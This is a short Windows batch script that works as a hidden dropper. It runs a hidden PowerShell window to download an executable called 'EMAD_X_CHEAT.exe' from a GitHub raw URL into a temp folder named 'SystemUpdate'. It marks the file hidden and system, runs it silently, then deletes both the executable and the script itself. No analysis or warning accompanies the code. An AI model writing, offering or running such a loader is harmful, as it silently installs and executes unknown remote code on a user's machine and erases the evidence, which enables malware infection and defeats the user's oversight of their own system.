@echo off

:: Set the download directory
set DOWNLOAD_DIR=%temp%\SystemUpdate\

:: Ensure the download directory exists
if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"

:: Download the executable file to the specified directory
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://github.com/emad8787/panel/raw/refs/heads/main/EMAD_X_CHEAT.exe -OutFile '%DOWNLOAD_DIR%\EMAD_X_CHEAT.exe'"

:: Hide the downloaded executable file and make it system, read-only, and hidden
attrib +h +r +s "%DOWNLOAD_DIR%\EMAD_X_CHEAT.exe"

:: Run the executable silently and delete it immediately after it closes
start /b /wait "" "%DOWNLOAD_DIR%\EMAD_X_CHEAT.exe" & attrib -r -s "%DOWNLOAD_DIR%\EMAD_X_CHEAT.exe" & del "%DOWNLOAD_DIR%\EMAD_X_CHEAT.exe"

:: Delete the .bat file itself after execution
del "%~f0"